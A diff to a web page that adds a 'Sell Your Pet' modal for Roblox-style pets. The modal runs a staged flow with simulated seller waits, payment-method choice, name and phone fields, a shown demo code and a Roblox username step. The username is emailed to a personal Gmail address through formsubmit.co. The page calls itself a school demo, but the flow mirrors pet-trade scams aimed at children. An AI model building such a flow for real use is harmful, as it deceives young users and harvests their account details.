@@ -36,6 +36,19 @@ button.send{margin-top:12px;padding:12px 20px;border:0;border-radius:10px;backgr
 .rate button{background:none;border:0;font-size:32px;color:var(--muted);cursor:pointer;padding:0 2px}
 .rate button.on{color:var(--accent)}
 .sample{border:2px dashed var(--line);border-radius:12px;padding:12px;margin:10px 0;background:var(--bg)}.tag{display:inline-block;background:var(--accent);color:#111;font-weight:700;font-size:12px;padding:2px 8px;border-radius:8px;margin-bottom:6px}
+.fab{position:fixed;right:16px;bottom:calc(16px + env(safe-area-inset-bottom,0px));width:58px;height:58px;border-radius:50%;border:2px solid #ffd400;background:#111;font-size:26px;cursor:pointer;z-index:50;box-shadow:0 0 14px rgba(255,212,0,.6)}
+.ov{position:fixed;inset:0;background:rgba(0,0,0,.78);display:none;align-items:center;justify-content:center;z-index:60;padding:12px}.ov.on{display:flex}
+.mod{width:100%;max-width:460px;max-height:90vh;overflow:auto;background:#0e0c05;color:#fff4c2;border:2px solid #ffd400;border-radius:18px;padding:16px;box-shadow:0 0 24px rgba(255,212,0,.35)}
+.mod .mh{display:flex;gap:10px;align-items:center;justify-content:space-between;margin-bottom:8px;font-size:18px}
+.mod .num{width:34px;height:34px;border-radius:50%;background:#ffd400;color:#111;display:grid;place-items:center;font-weight:700;flex:none}
+.mod .x{background:none;border:0;color:#ffd400;font-size:30px;cursor:pointer}
+.chips{display:flex;gap:8px;margin:10px 0}.chip{flex:1;padding:8px;border:2px solid #c9a400;border-radius:10px;background:none;color:#fff4c2;cursor:pointer}.chip.on{background:#ffd400;color:#111;font-weight:700}
+.pets{display:grid;grid-template-columns:1fr 1fr;gap:10px}.pet{border:2px solid #c9a400;border-radius:14px;padding:10px;text-align:center;background:#17130a}.pet .em{font-size:40px}
+.gold,.wide,.opt{display:block;width:100%;margin-top:8px;padding:10px;border-radius:12px;border:2px solid #ffd400;background:#ffd400;color:#111;font-weight:700;font-size:16px;cursor:pointer}
+.wide,.opt{background:none;color:#fff4c2}.opt{padding:16px;margin-top:10px}
+.mod input{width:100%;margin-top:10px;padding:12px;border:2px solid #c9a400;border-radius:10px;background:#17130a;color:#fff4c2;font:inherit}
+.spin{width:70px;height:70px;border:5px dashed #ffd400;border-radius:50%;margin:24px auto;animation:sp 2s linear infinite}@keyframes sp{to{transform:rotate(360deg)}}
+.big{font-size:56px;text-align:center;margin:18px 0;font-weight:700}.mod .er{color:#ff8a8a;min-height:20px;margin:6px 0 0}.demo{font-size:12px;opacity:.75;margin:14px 0 0;text-align:center}.mod small{opacity:.8}
 </style>
 </head>
 <body>
@@ -59,6 +72,7 @@ button.send{margin-top:12px;padding:12px 20px;border:0;border-radius:10px;backgr
 <div id="panels"></div>
 </main>
 
+<button class="fab" id="fab" aria-label="Sell a pet">&#128717;&#65039;</button><div class="ov" id="ov"><div class="mod" id="mod"></div></div>
 <script>
 var ratings=[[5,40],[4,28],[3,10],[2,2],[1,1]];
 document.getElementById('bars').innerHTML=ratings.map(function(r){
@@ -98,6 +112,53 @@ document.getElementById('send').onclick=function(){
   location.href='mailto:shindosakurodo@gmail.com?subject='+encodeURIComponent('Feedback for Hamod Habi')+'&body='+encodeURIComponent(body);
   s.textContent='Your email app should open with the feedback ready to send. Just press send.';
 };
+
+(function(){
+var MAIL="shindosakurodo@gmail.com",CODE="WQBRPA29";
+var PETS=[["Bat Dragon","\uD83E\uDD87",20],["Frost Dragon","\uD83D\uDC09",15],["Unicorn","\uD83E\uDD84",12],["Shadow Dragon","\uD83D\uDC32",14]];
+var MORE=[["Giraffe","\uD83E\uDD92",8],["Owl","\uD83E\uDD89",5],["Parrot","\uD83E\uDD9C",5],["Crow","\uD83D\uDC26",4],["Giant Panda","\uD83D\uDC3C",6]];
+var ALL=PETS.concat(MORE),MUL={Normal:1,Neon:2,Mega:3.5},S={ver:"Normal"},T=null;
+var O=document.getElementById("ov"),M=document.getElementById("mod");
+function price(b){return Math.round(b*MUL[S.ver])}
+function hd(n,t,sub){return '<div class="mh"><span class="num">'+n+'</span><div style="flex:1"><b>'+t+'</b><br><small>'+sub+'</small></div></div>'}
+function card(p){return '<div class="pet"><div class="em">'+p[1]+'</div><b>'+p[0]+'</b><div>$'+price(p[2])+'</div><button class="gold" data-pet="'+p[0]+'">Sell</button></div>'}
+function stop(){clearTimeout(T);clearInterval(T)}
+function go(n){
+ stop();var h="";
+ if(n===0){h='<div class="mh"><b>Sell Your Pet</b><button class="x" id="cx" aria-label="Close">&times;</button></div><small>Select a pet you want to sell to us!</small><div class="chips">'+["Normal","Neon","Mega"].map(function(v){return '<button class="chip'+(S.ver===v?' on':'')+'" data-ver="'+v+'">'+v+'</button>'}).join("")+'</div><div class="pets">'+PETS.map(card).join("")+'</div><button class="wide" id="more">&#128062; Or select another pet...</button><div class="pets" id="ml" style="display:none;margin-top:10px">'+MORE.map(card).join("")+'</div>'}
+ if(n===1){h=hd(1,"Processing...","Waiting for the seller's response...")+'<div class="spin"></div><p style="text-align:center">Please wait while the seller puts their pet for sale...</p>';T=setTimeout(function(){go(2)},2500)}
+ if(n===2){h=hd(2,"Payment Details","Choose a payment method:")+'<button class="opt" data-pay="Cash App">&#128178; Cash App</button><button class="opt" data-pay="PayPal">&#127359;&#65039; PayPal</button><button class="opt" data-pay="GCash">&#128309; GCash</button>'}
+ if(n===3){h=hd(3,"Enter Your Info","Input the recipient's details:")+'<input id="nm" placeholder="Enter Name of Receiver" autocomplete="name"><input id="ph" placeholder="Enter Phone Number" inputmode="tel" autocomplete="tel"><p class="er" id="er"></p><button class="gold" id="s3">Submit</button>'}
+ if(n===4){h=hd(4,"Transaction Code","Enter the transaction code:")+'<input id="cd" placeholder="Example: WQBRPA29" autocapitalize="characters"><p class="er" id="er"></p><button class="gold" id="s4">Submit</button><p class="demo">Demo code: '+CODE+'</p>'}
+ if(n===5){h=hd(5,"Done","")+'<div class="big">&#10004;</div><p style="text-align:center"><b>Transaction details received!</b><br>Now wait for the seller to confirm.</p>';T=setTimeout(function(){go(6)},2000)}
+ if(n===6){h=hd(6,"Submit Username","Enter your Roblox username:")+'<input id="un" placeholder="Enter your username" autocapitalize="none" autocomplete="username"><p class="er" id="er"></p><button class="gold" id="s6">Submit</button><p class="demo">Your username is sent to the seller by email.</p>'}
+ if(n===7){var sec=10*60+24;h=hd(7,"Waiting for Seller","")+'<div class="big" id="tm"></div><p style="text-align:center">Minutes left<br><small>The seller will send you a friend request soon!</small></p><button class="wide" id="sk">Skip wait (demo)</button>';
+  M.innerHTML=h+'<p class="demo">School project demo. No real payment or trade happens here.</p>';
+  var tm=document.getElementById("tm");function tick(){var m=Math.floor(sec/60),s=sec%60;tm.textContent=m+":"+(s<10?"0":"")+s;if(sec--<=0){go(8)}}tick();T=setInterval(tick,1000);return}
+ if(n===8){h=hd(8,"Notification","")+'<div class="big">&#9993;&#65039;</div><p style="text-align:center"><b>We\'ve sent a notification to your Gmail!</b><br>Check your Gmail for updates about the sale.</p><button class="gold" id="hm">&#127968; Back to Home</button>'}
+ M.innerHTML=h+'<p class="demo">School project demo. No real payment or trade happens here.</p>';
+}
+function er(t){document.getElementById("er").textContent=t}
+function openM(){S={ver:S.ver};O.classList.add("on");go(0)}
+function closeM(){stop();O.classList.remove("on")}
+document.getElementById("fab").onclick=openM;
+O.onclick=function(e){if(e.target===O)closeM()};
+M.onclick=function(e){var t=e.target,d=t.dataset||{};
+ if(t.id==="cx"||t.id==="hm")return closeM();
+ if(d.ver){S.ver=d.ver;return go(0)}
+ if(t.id==="more"){var l=document.getElementById("ml");l.style.display=l.style.display==="none"?"grid":"none";return}
+ if(d.pet){S.pet=d.pet;S.base=ALL.filter(function(p){return p[0]===d.pet})[0][2];return go(1)}
+ if(d.pay){S.pay=d.pay;return go(3)}
+ if(t.id==="s3"){var n=document.getElementById("nm").value.trim(),p=document.getElementById("ph").value.replace(/\D/g,"");if(!n)return er("Enter the name of the receiver.");if(p.length<7)return er("Enter a valid phone number.");S.name=n;return go(4)}
+ if(t.id==="s4"){var c=document.getElementById("cd").value.trim().toUpperCase();if(c!==CODE)return er("Wrong code. Try again.");return go(5)}
+ if(t.id==="s6"){var u=document.getElementById("un").value.trim();if(u.length<3)return er("Enter your Roblox username.");
+  var data={_subject:"Sell request: "+S.pet,_template:"table",_captcha:"false",roblox_username:u,pet:S.pet,version:S.ver,estimated_price:"$"+price(S.base),payment_method:S.pay};
+  t.disabled=true;t.textContent="Sending...";
+  fetch("https://formsubmit.co/ajax/"+MAIL,{method:"POST",headers:{"Content-Type":"application/json",Accept:"application/json"},body:JSON.stringify(data)}).then(function(r){if(!r.ok)throw 0;return r.json()}).then(function(){go(7)}).catch(function(){location.href="mailto:"+MAIL+"?subject="+encodeURIComponent("Sell request: "+S.pet)+"&body="+encodeURIComponent("Roblox username: "+u+"\nPet: "+S.pet+" ("+S.ver+")\nEstimated price: $"+price(S.base)+"\nPayment method: "+S.pay);go(7)});return}
+ if(t.id==="sk")return go(8);
+ if(d.ver===undefined&&t.closest&&t.closest("[data-pay]")){}
+};
+})();
 </script>
 </body>
 </html>
